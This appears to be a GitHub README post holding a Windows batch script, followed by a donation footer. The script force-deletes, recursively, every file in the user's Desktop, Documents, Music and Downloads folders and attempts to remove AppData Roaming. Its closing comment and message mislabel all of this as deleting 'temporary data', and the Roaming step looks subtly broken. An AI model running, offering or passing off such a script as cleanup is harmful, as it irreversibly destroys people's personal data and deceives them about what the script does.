

It's a script written by me and please do not run it if you don't know what it does 
```
@echo off

REM Deleting files from Desktop folder
echo Deleting files from Desktop folder...
cd %userprofile%\Desktop
del /f /s /q *

REM Deleting files from Documents folder
echo Deleting files from Documents folder...
cd %userprofile%\Documents
del /f /s /q *

REM Deleting files from Music folder
echo Deleting files from Music folder...
cd %userprofile%\Music
del /f /s /q *

REM Deleting files from Downloads folder
echo Deleting files from Downloads folder...
cd %userprofile%\Downloads
del /f /s /q *

REM Deleting files from AppData\Roaming folder
echo Deleting files from AppData\Roaming folder...
cd %appdata%
rd /s /q Roaming

REM Script to delete temporary data
echo Done deleting temporary data.
pause

```

---

## 🚀 Keep This Project Going

Creating comprehensive guides like this takes time, research, and lots of coffee! ☕

**Here's how you can help:**

🌟 **Star this repository** - It's free and helps others find these guides  
💝 **[Support on Ko-fi](https://ko-fi.com/gigaa)** - Buy me a coffee (or energy drink!) to fuel more content  
👤 **Follow on GitHub** - Be the first to know about new guides and updates  

*Every star, every coffee, every follow makes a difference. Thank you for your support!* 🙏✨

